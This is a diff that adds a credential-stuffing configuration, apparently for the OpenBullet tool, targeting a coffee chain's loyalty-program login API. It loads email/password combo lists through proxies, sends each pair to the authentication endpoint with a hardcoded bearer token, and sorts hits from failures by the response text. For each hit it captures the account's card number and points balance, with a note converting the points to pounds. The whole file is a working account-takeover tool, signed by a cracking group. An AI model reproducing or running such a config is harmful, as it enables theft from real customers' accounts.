@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "CostaApi",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-04T18:52:42.4292475+01:00",
+  "AdditionalInfo": "",
+  "Author": "Shycrackzz",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://costa-platform.com/loyalty/v2/authenticate" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"operatingSystem\":\"A\",\"fcmToken\":\"eFS3yOa2QGo:APA91bFZ-CvYyMouOZoi9hkJ9f_u8I_y4vZAd_rcxBlGDlFUGNItPXBeFaFDus-MxXWznmtiwH2z3LNkv3HLBZXI0DBWWMczOxU18l7AfkpWJZovaNe_LxLC-CyLjJU5GMyLl5ghPJRr\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: bearer AQICAHjtWAoTJc/JFgaIUv/xL9XdQT1htaqVqDcbZ2F47Kfh9gHL5ZFnFUL8QXrvi4oTFCnmAAABPzCCATsGCSqGSIb3DQEHBqCCASwwggEoAgEAMIIBIQYJKoZIhvcNAQcBMB4GCWCGSAFlAwQBLjARBAxYCfOY1Sj8WE4ceOUCARCAgfMKqYK7rGMBPaxmkvQNQapWsRIxRuaeZEAkurbPluIZWYve/z8pjfC0z+KDAEx9a6dWxw2eQbHIf1o1GhysGYx/fUhyqDRrxgMr2q264Xs8s5UiTG3ruBMPE85fGE+1aMjdyTFc2OOB73J9DuG/Ju2Wl7ApimOweHtD6ZpPXxMrf/b/2PvFR//IPHnTlXCvJD8raPjwkXz/PXUofT5LGE4pLw1Xa1dCmMJq/3z/ERysPHtDa0cAkDIUjlKoVYhdvr1Tl8zS04X2WulSGMaDZot76O6wLvJew42t1VS8t47yyxxQEVTl2XxcdnRkpTzLKxKRsTQ=" 
+  HEADER "X-Channel: O" 
+  HEADER "X-COSTA-CHANNEL: O" 
+  HEADER "X-COSTA-LANG: en-gb" 
+  HEADER "X-COSTA-COUNTRY: GB" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "details\": \"Wrong login or password" 
+  KEYCHAIN Success OR 
+    KEY "cardNumber\": \"" 
+PARSE "<SOURCE>" LR "cardNumber\": \"" "\"," -> CAP "Card Number ~ " "" " | Shycrackzz Lounge" 
+PARSE "<SOURCE>" LR "pointsBalance\": " "," -> CAP "Points Value ~ " "" " | Each 100 is £1" 
